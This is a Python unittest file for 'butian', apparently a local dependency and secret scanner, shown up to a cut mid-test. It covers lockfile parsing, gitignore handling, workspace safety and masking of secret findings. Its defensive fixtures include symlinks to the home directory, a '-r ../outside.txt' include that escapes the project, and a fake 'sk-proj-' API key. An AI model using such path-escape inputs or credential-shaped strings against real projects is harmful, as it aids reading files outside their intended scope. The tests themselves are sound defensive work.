"""Comprehensive tests for butian/scripts/scan.py.

Covers secret detection (97 patterns), entropy engine, sensitive files,
gitignore helpers, lockfile parsers, vulnerability data parsing, CVSS scoring,
workspace management, utility helpers, and pipeline integration.
"""

# butian: allow-secret-fixtures

import json
import os
import subprocess
import sys
import tempfile
import unittest
from types import SimpleNamespace
from unittest import mock

# Import scan module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "butian", "scripts"))
from butian.scripts import analyze, run_audit, scan, vulnerability_sources, workspace


class ScanPipelineTests(unittest.TestCase):
    def test_user_agent_is_browser_like_and_header_safe(self):
        scan.HTTP_USER_AGENT.encode("latin-1")
        self.assertTrue(scan.HTTP_USER_AGENT.startswith("Mozilla/5.0"))
        self.assertIn("Safari/", scan.HTTP_USER_AGENT)

    def test_project_root_prefers_nearest_project_over_enclosing_git_repo(self):
        with tempfile.TemporaryDirectory(prefix="butian-monorepo-") as root:
            app = os.path.join(root, "apps", "web")
            os.makedirs(app)
            subprocess.run(
                ["git", "init"],
                cwd=root,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
            )
            with open(
                os.path.join(app, "package-lock.json"), "w", encoding="utf-8"
            ) as handle:
                json.dump(
                    {
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "web", "version": "0.0.0"},
                            "node_modules/lodash": {"version": "4.17.20"},
                        },
                    },
                    handle,
                )

        self.assertEqual(scan.find_project_root(app), app)


class WorkspaceSafetyTests(unittest.TestCase):
    def test_rejects_symlink_to_protected_project_root(self):
        home = os.path.expanduser("~")
        if not home or home == "~":
            self.skipTest("home directory is unavailable")
        with tempfile.TemporaryDirectory(prefix="butian-safe-path-") as root:
            link_path = os.path.join(root, "home-link")
            try:
                os.symlink(home, link_path)
            except (AttributeError, OSError) as exc:
                self.skipTest(f"symlink unavailable: {exc}")

            with self.assertRaises(ValueError):
                workspace.ensure_safe_project_path(link_path)

    def test_rejects_gitignore_symlink_before_appending_rules(self):
        with tempfile.TemporaryDirectory(prefix="butian-gitignore-link-") as parent:
            project = os.path.join(parent, "project")
            os.makedirs(project)
            outside = os.path.join(parent, "outside.gitignore")
            with open(outside, "w", encoding="utf-8") as handle:
                handle.write("# outside\n")
            try:
                os.symlink(outside, os.path.join(project, ".gitignore"))
            except (AttributeError, OSError) as exc:
                self.skipTest(f"symlink unavailable: {exc}")

            with self.assertRaises(ValueError):
                workspace.ensure_butian_gitignore(project)

            with open(outside, "r", encoding="utf-8") as handle:
                self.assertEqual(handle.read(), "# outside\n")

    def test_rejects_butian_workspace_symlink_before_creating_run(self):
        with tempfile.TemporaryDirectory(prefix="butian-workspace-link-") as parent:
            project = os.path.join(parent, "project")
            outside = os.path.join(parent, "outside-workspace")
            os.makedirs(project)
            os.makedirs(outside)
            try:
                os.symlink(outside, os.path.join(project, ".butian"))
            except (AttributeError, OSError) as exc:
                self.skipTest(f"symlink unavailable: {exc}")

            with self.assertRaises(ValueError):
                workspace.ensure_butian_run(project)


# ---------------------------------------------------------------------------
# dependency_parsers module compatibility
# ---------------------------------------------------------------------------
class DependencyParsersModuleCompatibilityTests(unittest.TestCase):
    def test_scan_reexports_dependency_parser_helpers(self):
        from butian.scripts import dependency_parsers

        self.assertIs(scan.LOCKFILE_MAP, dependency_parsers.LOCKFILE_MAP)
        self.assertIs(scan.detect_ecosystems, dependency_parsers.detect_ecosystems)
        self.assertIs(scan.extract_packages, dependency_parsers.extract_packages)
        self.assertIs(scan.parse_npm_lock, dependency_parsers.parse_npm_lock)
        self.assertIs(
            scan.parse_requirements_txt, dependency_parsers.parse_requirements_txt
        )

    def test_npm_lock_nested_node_modules_uses_real_package_names(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-nested-") as root:
            with open(
                os.path.join(root, "package-lock.json"), "w", encoding="utf-8"
            ) as handle:
                json.dump(
                    {
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "demo", "version": "0.0.0"},
                            "node_modules/foo": {"version": "1.0.0"},
                            "node_modules/foo/node_modules/bar": {"version": "2.0.0"},
                            "node_modules/foo/node_modules/@scope/baz": {
                                "version": "3.0.0"
                            },
                        },
                    },
                    handle,
                )

            packages = scan.parse_npm_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in packages],
                [
                    ("foo", "1.0.0"),
                    ("bar", "2.0.0"),
                    ("@scope/baz", "3.0.0"),
                ],
            )

    def test_requirements_parser_only_uses_exact_pinned_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-reqs-") as root:
            with open(
                os.path.join(root, "requirements.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write(
                    "requests>=2.0\ndjango<4\nflask==2.0.3\nstarlette==0.37.*\n"
                )

            packages = scan.parse_requirements_txt(root)

            self.assertEqual(
                packages,
                [
                    {
                        "ecosystem": "pypi",
                        "name": "flask",
                        "version": "2.0.3",
                        "specifier": "==",
                        "is_direct": True,
                        "source": "requirements.txt",
                    }
                ],
            )

    def test_requirements_parser_skips_includes_outside_project(self):
        with tempfile.TemporaryDirectory(prefix="butian-reqs-") as parent:
            root = os.path.join(parent, "project")
            os.makedirs(os.path.join(root, "nested"), exist_ok=True)
            with open(
                os.path.join(parent, "outside.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write("leaked==1.0.0\n")
            with open(
                os.path.join(root, "nested", "inside.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write("safe==2.0.0\n")
            with open(
                os.path.join(root, "requirements.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write("-r ../outside.txt\n-r nested/inside.txt\n")

            packages = scan.parse_requirements_txt(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in packages],
                [("safe", "2.0.0")],
            )

    def test_scan_warns_when_dependency_file_has_no_exact_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-reqs-range-") as root:
            with open(
                os.path.join(root, "requirements.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write("requests>=2.0\ndjango<4\n")

            result = subprocess.run(
                [
                    sys.executable,
                    os.path.join("butian", "scripts", "scan.py"),
                    "--no-root-discovery",
                    "--skip-hygiene",
                    "--skip-outdated",
                    root,
                ],
                cwd=os.path.dirname(
                    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                ),
                capture_output=True,
                text=True,
                check=True,
            )
            output = json.loads(result.stdout)

            self.assertEqual(output["schema_version"], scan.SCAN_SCHEMA_VERSION)
            self.assertEqual(output["scan_config"]["scan_mode"], "full_dependency_scan")
            self.assertEqual(output["package_count"], 0)
            self.assertTrue(
                any("精确版本" in item.get("message", "") for item in output["errors"])
            )

    def test_pip_outdated_skips_when_project_has_no_local_virtualenv(self):
        with tempfile.TemporaryDirectory(prefix="butian-pypi-") as root:
            calls = []
            original = scan.run_cmd_checked

            def fake_run_cmd_checked(*args, **kwargs):
                calls.append((args, kwargs))
                return "[]"

            scan.run_cmd_checked = fake_run_cmd_checked
            try:
                errors = []
                self.assertEqual(scan._pip_outdated(root, errors), [])
            finally:
                scan.run_cmd_checked = original

            self.assertEqual(calls, [])
            self.assertTrue(
                any("项目本地虚拟环境" in item.get("message", "") for item in errors)
            )

    def test_pip_outdated_skips_project_virtualenv_without_opt_in(self):
        with tempfile.TemporaryDirectory(prefix="butian-pypi-") as root:
            bin_dir = os.path.join(root, ".venv", "bin")
            os.makedirs(bin_dir)
            with open(
                os.path.join(root, ".venv", "pyvenv.cfg"), "w", encoding="utf-8"
            ) as handle:
                handle.write("home = /usr/bin\n")
            python = os.path.join(bin_dir, "python")
            with open(python, "w", encoding="utf-8") as handle:
                handle.write("#!/bin/sh\nexit 0\n")
            os.chmod(python, 0o755)
            calls = []
            original = scan.run_cmd_checked

            def fake_run_cmd_checked(*args, **kwargs):
                calls.append((args, kwargs))
                return "[]"

            scan.run_cmd_checked = fake_run_cmd_checked
            try:
                errors = []
                self.assertEqual(scan._pip_outdated(root, errors), [])
            finally:
                scan.run_cmd_checked = original

            self.assertEqual(calls, [])
            self.assertTrue(
                any(
                    "--allow-project-exec" in item.get("message", "") for item in errors
                )
            )

    def test_uv_outdated_skips_project_tool_without_opt_in(self):
        with tempfile.TemporaryDirectory(prefix="butian-pypi-uv-") as root:
            with open(os.path.join(root, "uv.lock"), "w", encoding="utf-8") as handle:
                handle.write("")
            calls = []
            original = scan.run_cmd_checked

            def fake_run_cmd_checked(*args, **kwargs):
                calls.append((args, kwargs))
                return "[]"

            scan.run_cmd_checked = fake_run_cmd_checked
            try:
                errors = []
                self.assertEqual(scan._pip_outdated(root, errors), [])
            finally:
                scan.run_cmd_checked = original

            self.assertEqual(calls, [])
            self.assertTrue(
                any("--allow-project-exec" in item.get("message", "") for item in errors)
            )

    def test_pip_outdated_runs_project_virtualenv_when_opted_in(self):
        with tempfile.TemporaryDirectory(prefix="butian-pypi-") as root:
            bin_dir = os.path.join(root, ".venv", "bin")
            os.makedirs(bin_dir)
            with open(
                os.path.join(root, ".venv", "pyvenv.cfg"), "w", encoding="utf-8"
            ) as handle:
                handle.write("home = /usr/bin\n")
            python = os.path.join(bin_dir, "python")
            with open(python, "w", encoding="utf-8") as handle:
                handle.write("#!/bin/sh\nexit 0\n")
            os.chmod(python, 0o755)
            calls = []
            original = scan.run_cmd_checked

            def fake_run_cmd_checked(cmd, *args, **kwargs):
                calls.append(cmd)
                return "[]"

            scan.run_cmd_checked = fake_run_cmd_checked
            try:
                errors = []
                self.assertEqual(
                    scan._pip_outdated(root, errors, allow_project_exec=True), []
                )
            finally:
                scan.run_cmd_checked = original

            self.assertEqual(calls[0][0], python)

    def test_cargo_outdated_skips_with_clear_message_when_subcommand_missing(self):
        calls = []
        original = scan.run_cmd_checked

        def fake_run_cmd_checked(cmd, *args, **kwargs):
            calls.append(cmd)
            return ""

        scan.run_cmd_checked = fake_run_cmd_checked
        try:
            errors = []
            self.assertEqual(scan._cargo_outdated("/tmp/demo", errors), [])
        finally:
            scan.run_cmd_checked = original

        self.assertEqual(calls, [["cargo", "outdated", "--help"]])
        self.assertTrue(any("cargo-outdated" in item["message"] for item in errors))

    def test_preflight_custom_output_still_prepares_project_workspace(self):
        with (
            tempfile.TemporaryDirectory(prefix="butian-preflight-project-") as root,
            tempfile.TemporaryDirectory(prefix="butian-preflight-output-") as out_dir,
        ):
            output = os.path.join(out_dir, "preflight.json")

            result = subprocess.run(
                [
                    sys.executable,
                    os.path.join("butian", "scripts", "detect.py"),
                    "--compact",
                    "--output",
                    output,
                    root,
                ],
                cwd=os.path.dirname(
                    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                ),
                capture_output=True,
                text=True,
                check=True,
            )
            preflight = json.loads(result.stdout)

            self.assertEqual(preflight["output_file"], output)
            self.assertTrue(os.path.isdir(os.path.join(root, ".butian")))
            with open(
                os.path.join(root, ".gitignore"), "r", encoding="utf-8"
            ) as handle:
                content = handle.read()
            lines = content.splitlines()
            self.assertIn(".butian/", lines)
            self.assertIn("docs/butian/*/security-report.md", lines)
            self.assertIn("docs/butian/*/security-report.html", lines)
            self.assertIn("docs/butian/*/security-report-final.md", lines)
            self.assertIn("docs/butian/*/security-report-final.html", lines)
            self.assertNotIn("docs/butian", lines)
            self.assertTrue(
                os.path.abspath(preflight["butian_workspace"]["run_dir"]).startswith(
                    os.path.join(os.path.abspath(root), ".butian")
                )
            )

    def test_scan_rejects_preflight_run_dir_outside_project_workspace(self):
        with (
            tempfile.TemporaryDirectory(prefix="butian-preflight-project-") as root,
            tempfile.TemporaryDirectory(prefix="butian-preflight-outside-") as outside,
            tempfile.TemporaryDirectory(prefix="butian-preflight-file-") as meta_dir,
        ):
            preflight_path = os.path.join(meta_dir, "preflight.json")
            with open(preflight_path, "w", encoding="utf-8") as handle:
                json.dump(
                    {
                        "project": {"path": root},
                        "output_file": os.path.join(outside, "assets", "scan.json"),
                        "butian_workspace": {"run_dir": outside},
                    },
                    handle,
                )

            result = subprocess.run(
                [
                    sys.executable,
                    os.path.join("butian", "scripts", "scan.py"),
                    "--preflight",
                    preflight_path,
                ],
                cwd=os.path.dirname(
                    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                ),
                capture_output=True,
                text=True,
            )

            self.assertEqual(result.returncode, 2)
            self.assertIn("运行目录", result.stderr)
            self.assertFalse(os.path.isdir(os.path.join(outside, "assets")))

    def test_human_summary_warns_when_hygiene_only_skips_dependency_scan(self):
        summary = {
            "scan_mode": "hygiene_only",
            "markdown_report": "/tmp/demo/docs/butian/2026-0605/security-report.md",
            "html_report": "/tmp/demo/docs/butian/2026-0605/security-report.html",
            "analysis_file": "/tmp/demo/.butian/run/assets/analysis.json",
            "errors": [],
        }
        scan_output = {
            "project": {"path": "/tmp/demo"},
            "scan_config": {"scan_mode": "hygiene_only"},
            "hygiene": {},
        }
        analysis = {
            "project": {"path": "/tmp/demo", "ecosystems": [], "total_packages": 0},
            "risk_summary": {
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0,
                "info": 0,
            },
            "top_issues": [],
            "hygiene": {},
            "outdated": [],
            "errors": [],
        }

        text = run_audit.format_human_summary(
            summary,
            scan_output,
            analysis,
            SimpleNamespace(no_open=True, final_report=False),
        )

        self.assertIn("暂无法执行依赖漏洞扫描", text)
        self.assertNotIn("未发现需要优先处理的依赖漏洞", text)

    def test_dependency_fix_items_are_grouped_by_package(self):
        scan_output = {
            "generated_at": "2026-06-05 09:05:50",
            "scan_seconds": 0.1,
            "project": {
                "name": "demo",
                "path": "/tmp/demo",
                "ecosystems": ["npm"],
                "total_packages": 1,
            },
            "scan_config": {"scan_mode": "full_dependency_scan"},
            "hygiene": {},
            "outdated": [],
            "errors": [],
            "vulnerabilities": [
                {
                    "package": "lodash",
                    "version": "4.17.20",
                    "ecosystem": "npm",
                    "severity": "high",
                    "advisory_id": "GHSA-high",
                    "fixed_versions": ["4.17.21"],
                    "summary": "Command injection in lodash",
                },
                {
                    "package": "lodash",
                    "version": "4.17.20",
                    "ecosystem": "npm",
                    "severity": "medium",
                    "advisory_id": "GHSA-medium",
                    "fixed_versions": ["4.17.23"],
                    "summary": "Prototype pollution in lodash",
                },
                {
                    "package": "lodash",
                    "version": "4.17.20",
                    "ecosystem": "npm",
                    "severity": "info",
                    "advisory_id": "GHSA-info",
                    "fixed_versions": [],
                    "summary": "Severity data is not available yet",
                },
            ],
        }

        analysis = analyze.build_analysis(scan_output)

        upgrades = [
            item
            for item in analysis["green"]
            if item.get("type") == "dependency_upgrade"
        ]
        self.assertEqual(len(upgrades), 1)
        upgrade = upgrades[0]
        self.assertEqual(upgrade["package"], "lodash")
        self.assertEqual(upgrade["severity"], "high")
        self.assertEqual(upgrade["fix_config"]["target_version"], "4.17.23")
        self.assertEqual(
            upgrade["fix_config"]["advisory_ids"],
            ["GHSA-high", "GHSA-medium", "GHSA-info"],
        )
        self.assertEqual(
            upgrade["fix_config"]["fixed_versions_by_advisory"],
            {
                "GHSA-high": ["4.17.21"],
                "GHSA-medium": ["4.17.23"],
                "GHSA-info": [],
            },
        )
        self.assertIn("命中 3 个风险项", upgrade["summary"])
        self.assertIn("部分公告未给出明确修复版本", upgrade["summary"])

    def test_build_report_output_is_visible_in_human_mode(self):
        self.assertFalse(hasattr(run_audit, "should_echo_build_report"))

    def test_pipeline_scripts_expose_help(self):
        root = os.path.dirname(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        )
        for script_name in [
            "detect.py",
            "scan.py",
            "analyze.py",
            "report.py",
            "visualize.py",
            "run_audit.py",
        ]:
            with self.subTest(script_name=script_name):
                result = subprocess.run(
                    [
                        sys.executable,
                        os.path.join("butian", "scripts", script_name),
                        "--help",
                    ],
                    cwd=root,
                    capture_output=True,
                    text=True,
                )

                self.assertEqual(result.returncode, 0, result.stderr or result.stdout)
                self.assertIn("usage:", result.stdout.lower())

    def test_skill_doc_describes_report_writes_without_absolute_read_only_claim(self):
        root = os.path.dirname(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        )
        with open(os.path.join(root, "butian", "SKILL.md"), encoding="utf-8") as handle:
            skill_doc = handle.read()

        self.assertIn(
            "check local dependency security, run repository security checks",
            skill_doc,
        )
        self.assertIn("不会修改业务源码、依赖、数据库或日志", skill_doc)
        self.assertIn("会创建/更新 `.butian/` 本地报告工作区", skill_doc)
        self.assertIn("会确保 `.gitignore` 忽略 `.butian/`", skill_doc)
        self.assertIn("模板文件也只展示脱敏命中值", skill_doc)
        self.assertIn("报告路径必须是绝对路径", skill_doc)
        self.assertIn("禁止改写成 `docs/butian/...`", skill_doc)
        self.assertIn("不要展示内部 `analysis.json` 路径", skill_doc)
        self.assertIn("docs/butian/<日期>/security-report.md", skill_doc)
        self.assertIn("docs/butian/<日期>/security-report-final.md", skill_doc)
        self.assertIn("## Default Flow", skill_doc)
        self.assertNotIn("默认执行规则", skill_doc)
        self.assertIn("第一次扫描报告", skill_doc)
        self.assertIn("运行 `run_audit.py` 完成首次扫描", skill_doc)
        self.assertNotIn("命令" + "示例用于说明执行方式", skill_doc)
        self.assertNotIn("\u8865\u5929" + "脚本", skill_doc)
        self.assertIn("macOS / Linux", skill_doc)
        self.assertIn("python3 scripts/run_audit.py", skill_doc)
        self.assertIn("Windows", skill_doc)
        self.assertIn("py -3 scripts/run_audit.py", skill_doc)
        self.assertIn("修复和复扫结束后，运行", skill_doc)
        self.assertIn("修复完成后的最终报告", skill_doc)
        self.assertIn("不扫描系统 Python、全局 npm、全局 pnpm 或操作系统包", skill_doc)
        self.assertNotIn("--" + "server" + "-only", skill_doc)
        self.assertNotIn("--" + "server" + "-inventory", skill_doc)
        self.assertNotIn("新手快速路径", skill_doc)
        self.assertNotIn("手动运行时", skill_doc)
        self.assertNotIn("# 在本 skill 目录中", skill_doc)
        self.assertNotIn("# 不在本 skill 目录中", skill_doc)
        self.assertNotIn("展示完整命中值", skill_doc)
        self.assertNotIn("docs/security-report-YYYY-MM-DD.md", skill_doc)
        self.assertNotIn("全程只读，绝不擅自动手", skill_doc)
        self.assertNotIn("没有任何会触发本地操作的按钮", skill_doc)


# ---------------------------------------------------------------------------
# vulnerability_sources module compatibility
# ---------------------------------------------------------------------------
class VulnerabilitySourcesModuleCompatibilityTests(unittest.TestCase):
    def test_scan_reexports_vulnerability_source_helpers(self):
        from butian.scripts import vulnerability_sources

        self.assertIs(scan.OSV_ECOSYSTEMS, vulnerability_sources.OSV_ECOSYSTEMS)
        self.assertIs(scan.normalize_cve_id, vulnerability_sources.normalize_cve_id)
        self.assertIs(
            scan.cvss_score_to_severity,
            vulnerability_sources.cvss_score_to_severity,
        )
        self.assertIs(
            scan.osv_query_for_package, vulnerability_sources.osv_query_for_package
        )
        self.assertIs(
            scan.fetch_osv_querybatch, vulnerability_sources.fetch_osv_querybatch
        )
        self.assertIs(
            scan.fetch_osv_vulnerability,
            vulnerability_sources.fetch_osv_vulnerability,
        )
        self.assertIs(
            scan.fetch_nvd_enrichments,
            vulnerability_sources.fetch_nvd_enrichments,
        )
        self.assertIs(
            scan.fetch_cisa_kev_enrichments,
            vulnerability_sources.fetch_cisa_kev_enrichments,
        )
        self.assertIs(
            scan.fetch_epss_enrichments,
            vulnerability_sources.fetch_epss_enrichments,
        )
        self.assertIs(
            scan.check_vulnerabilities,
            vulnerability_sources.check_vulnerabilities,
        )


class GitignoreEntryTests(unittest.TestCase):
    def test_matches_butian_slash(self):
        self.assertTrue(scan.has_butian_gitignore_entry(".butian/\n"))

    def test_matches_butian_no_slash(self):
        self.assertTrue(scan.has_butian_gitignore_entry(".butian\n"))

    def test_no_match_in_comment(self):
        self.assertFalse(scan.has_butian_gitignore_entry("# .butian/\n"))

    def test_no_match_embedded(self):
        self.assertFalse(scan.has_butian_gitignore_entry("foo.butian/\n"))

    def test_matches_among_other_rules(self):
        content = "node_modules/\n.butian/\ndist/\n"
        self.assertTrue(scan.has_butian_gitignore_entry(content))


class GitignoreRulesTests(unittest.TestCase):
    def test_extracts_rules(self):
        content = "node_modules/\n# comment\n.dist/\n"
        rules = scan.gitignore_rules(content)
        self.assertEqual(rules, {"node_modules", ".dist"})

    def test_strips_trailing_slash(self):
        rules = scan.gitignore_rules(".butian/\n")
        self.assertIn(".butian", rules)

    def test_empty_lines_ignored(self):
        rules = scan.gitignore_rules("\n\n\n")
        self.assertEqual(rules, set())


class GitignoreIgnoresTests(unittest.TestCase):
    def test_simple_match(self):
        self.assertTrue(scan.gitignore_ignores(".butian/\n", ".butian"))

    def test_glob_match(self):
        self.assertTrue(scan.gitignore_ignores(".env*\n", ".env"))

    def test_double_star_matches_root_path(self):
        self.assertTrue(scan.gitignore_ignores("**/.env\n", ".env"))

    def test_negation(self):
        content = ".butian/\n!.butian\n"
        self.assertFalse(scan.gitignore_ignores(content, ".butian"))

    def test_no_match(self):
        self.assertFalse(scan.gitignore_ignores("node_modules/\n", ".butian"))


class IsEnvTemplateTests(unittest.TestCase):
    def test_env_example(self):
        self.assertTrue(scan.is_env_template(".env.example"))

    def test_env_sample(self):
        self.assertTrue(scan.is_env_template(".env.sample"))

    def test_env_template(self):
        self.assertTrue(scan.is_env_template(".env.template"))

    def test_env_dist(self):
        self.assertTrue(scan.is_env_template(".env.dist"))

    def test_env_production_not_template(self):
        self.assertFalse(scan.is_env_template(".env.production"))

    def test_env_not_template(self):
        self.assertFalse(scan.is_env_template(".env"))

    def test_path_uses_basename(self):
        self.assertTrue(scan.is_env_template("/project/.env.example"))


class IsEnvSecretScanFileTests(unittest.TestCase):
    def test_envrc(self):
        self.assertTrue(scan.is_env_secret_scan_file(".envrc"))

    def test_env_bare(self):
        self.assertTrue(scan.is_env_secret_scan_file(".env"))

    def test_env_dot_suffix(self):
        self.assertTrue(scan.is_env_secret_scan_file(".env.local"))

    def test_env_dot_example_is_secret_candidate(self):
        # .env.example starts with ".env.", so it remains a secret scan candidate.
        # (actual template filtering happens in is_env_template / sensitive_file_type)
        self.assertTrue(scan.is_env_secret_scan_file(".env.example"))

    def test_secret_code_context_uses_three_line_window(self):
        lines = [f"line {idx}\n" for idx in range(1, 6)]

        first = scan.build_secret_code_context(lines, 1)
        middle = scan.build_secret_code_context(lines, 3)
        last = scan.build_secret_code_context(lines, 5)

        self.assertEqual([item["line"] for item in first], [1, 2, 3])
        self.assertTrue(first[0]["match"])
        self.assertEqual([item["line"] for item in middle], [2, 3, 4])
        self.assertTrue(middle[1]["match"])
        self.assertEqual([item["line"] for item in last], [3, 4, 5])
        self.assertTrue(last[2]["match"])

    def test_env_example_secret_uses_readable_three_line_masked_context(self):
        with tempfile.TemporaryDirectory(prefix="butian-env-example-secret-") as root:
            key = "sk-proj-" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
            lines = [f"SETTING_{i}=value{i}" for i in range(1, 18)]
            lines[16] = f'OPENAI_API_KEY="{key}"'
            with open(os.path.join(root, ".env.example"), "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")

            findings = scan.scan_secrets(root)

            finding = next(f for f in findings if f["file"] == ".env.example")
            self.assertEqual(finding["line"], 17)
            self.assertNotEqual(finding["preview"], key)
            self.assertIn("sk-proj", finding["preview"])
            self.assertIn(key[-4:], finding["preview"])
            self.assertIn("...", finding["preview"])
            self.assertNotIn("ABCDEFGHIJKL", finding["preview"])
            self.assertNotIn("QRSTUVWXYZ", finding["preview"])
            context = finding.get("code_context") or []
            self.assertEqual([item["line"] for item in context], [15, 16, 17])
            self.assertNotIn(key, context[2]["content"])
            self.assertIn('OPENAI_API_KEY="sk-proj', context[2]["content"])
            self.assertIn(key[-4:], context[2]["content"])
            self.assertNotIn("ABCDEFGHIJKL", context[2]["content"])
            self.assertNotIn("QRSTUVWXYZ", context[2]["content"])
            self.assertTrue(context[2]["match"])


class NpmLockPackageNameTests(unittest.TestCase):
    def test_simple_package(self):
        self.assertEqual(scan.npm_lock_package_name("node_modules/lodash"), "lodash")

    def test_scoped_package(self):
        self.assertEqual(
            scan.npm_lock_package_name("node_modules/@babel/core"), "@babel/core"
        )

    def test_nested_package(self):
        self.assertEqual(
            scan.npm_lock_package_name("node_modules/foo/node_modules/bar"), "bar"
        )

    def test_no_node_modules_prefix(self):
        self.assertEqual(scan.npm_lock_package_name("something-else"), "")

    def test_empty_string(self):
        self.assertEqual(scan.npm_lock_package_name(""), "")


class ParseNpmLockV2Tests(unittest.TestCase):
    def test_dependencies_key_format(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-v2-") as root:
            with open(os.path.join(root, "package-lock.json"), "w") as f:
                json.dump(
                    {
                        "lockfileVersion": 2,
                        "dependencies": {
                            "lodash": {"version": "4.17.21"},
                            "express": {"version": "4.18.2"},
                        },
                    },
                    f,
                )
            pkgs = scan.parse_npm_lock(root)
            names = [(p["name"], p["version"]) for p in pkgs]
            self.assertIn(("lodash", "4.17.21"), names)
            self.assertIn(("express", "4.18.2"), names)

    def test_packages_map_takes_precedence_when_dependencies_also_exists(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-v2-packages-") as root:
            with open(os.path.join(root, "package-lock.json"), "w") as f:
                json.dump(
                    {
                        "lockfileVersion": 2,
                        "dependencies": {
                            "postcss": {"version": "8.5.10"},
                        },
                        "packages": {
                            "": {"dependencies": {"next": "16.2.6"}},
                            "node_modules/postcss": {"version": "8.5.10"},
                            "node_modules/next/node_modules/postcss": {
                                "version": "8.4.31"
                            },
                        },
                    },
                    f,
                )

            pkgs = scan.parse_npm_lock(root)
            names = [(p["name"], p["version"]) for p in pkgs]

            self.assertIn(("postcss", "8.5.10"), names)
            self.assertIn(("postcss", "8.4.31"), names)

    def test_legacy_dependencies_tree_is_parsed_recursively(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-v1-tree-") as root:
            with open(os.path.join(root, "package-lock.json"), "w") as f:
                json.dump(
                    {
                        "lockfileVersion": 1,
                        "dependencies": {
                            "next": {
                                "version": "16.2.6",
                                "dependencies": {"postcss": {"version": "8.4.31"}},
                            }
                        },
                    },
                    f,
                )

            pkgs = scan.parse_npm_lock(root)
            names = [(p["name"], p["version"]) for p in pkgs]

            self.assertIn(("next", "16.2.6"), names)
            self.assertIn(("postcss", "8.4.31"), names)

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-") as root:
            self.assertEqual(scan.parse_npm_lock(root), [])

    def test_invalid_json(self):
        with tempfile.TemporaryDirectory(prefix="butian-npm-") as root:
            with open(os.path.join(root, "package-lock.json"), "w") as f:
                f.write("not json")
            self.assertEqual(scan.parse_npm_lock(root), [])


class ParsePnpmLockTests(unittest.TestCase):
    def test_v9_format(self):
        with tempfile.TemporaryDirectory(prefix="butian-pnpm-") as root:
            with open(os.path.join(root, "pnpm-lock.yaml"), "w") as f:
                f.write(
                    "packages:\n"
                    "  'lodash@4.17.21':\n"
                    "    resolution: ..."
                    "\n"
                    "  '@babel/core@7.24.0':\n"
                    "    resolution: ...\n"
                )
            pkgs = scan.parse_pnpm_lock(root)
            names = {p["name"] for p in pkgs}
            self.assertIn("lodash", names)
            self.assertIn("@babel/core", names)

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-pnpm-") as root:
            self.assertEqual(scan.parse_pnpm_lock(root), [])


class ParseYarnLockTests(unittest.TestCase):
    def test_v1_format(self):
        with tempfile.TemporaryDirectory(prefix="butian-yarn-") as root:
            with open(os.path.join(root, "yarn.lock"), "w") as f:
                f.write(
                    "# yarn lockfile v1\n"
                    "lodash@^4.0.0:\n"
                    '  version "4.17.21"\n'
                    "\n"
                    '"@babel/core@^7.0.0":\n'
                    '  version "7.24.0"\n'
                )
            pkgs = scan.parse_yarn_lock(root)
            names = {p["name"] for p in pkgs}
            self.assertIn("lodash", names)
            self.assertIn("@babel/core", names)

    def test_berry_format(self):
        with tempfile.TemporaryDirectory(prefix="butian-yarn-") as root:
            with open(os.path.join(root, "yarn.lock"), "w") as f:
                f.write(
                    "__metadata:\n"
                    "  version: 6\n"
                    "\n"
                    '"lodash@npm:^4.0.0":\n'
                    "  version: 4.17.21\n"
                    "\n"
                    '"@babel/core@npm:7.24.0":\n'
                    "  version: 7.24.0\n"
                )
            pkgs = scan.parse_yarn_lock(root)
            names = {p["name"] for p in pkgs}
            self.assertIn("lodash", names)
            self.assertIn("@babel/core", names)
            self.assertNotIn("__metadata", names)

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-yarn-") as root:
            self.assertEqual(scan.parse_yarn_lock(root), [])


class ParseComposerLockTests(unittest.TestCase):
    def test_parses_packages_and_packages_dev(self):
        with tempfile.TemporaryDirectory(prefix="butian-composer-") as root:
            with open(os.path.join(root, "composer.lock"), "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "packages": [
                            {"name": " Symfony/Console ", "version": "v6.4.8"},
                            {"name": "monolog/monolog", "version": "3.6.0"},
                        ],
                        "packages-dev": [
                            {"name": "phpunit/phpunit", "version": "10.5.17"}
                        ],
                    },
                    f,
                )

            pkgs = scan.parse_composer_lock(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "packagist",
                        "name": "symfony/console",
                        "version": "6.4.8",
                        "is_direct": False,
                        "source": "composer.lock",
                    },
                    {
                        "ecosystem": "packagist",
                        "name": "monolog/monolog",
                        "version": "3.6.0",
                        "is_direct": False,
                        "source": "composer.lock",
                    },
                    {
                        "ecosystem": "packagist",
                        "name": "phpunit/phpunit",
                        "version": "10.5.17",
                        "is_direct": False,
                        "source": "composer.lock",
                    },
                ],
            )

    def test_skips_missing_version(self):
        with tempfile.TemporaryDirectory(prefix="butian-composer-") as root:
            with open(os.path.join(root, "composer.lock"), "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "packages": [
                            {"name": "symfony/console"},
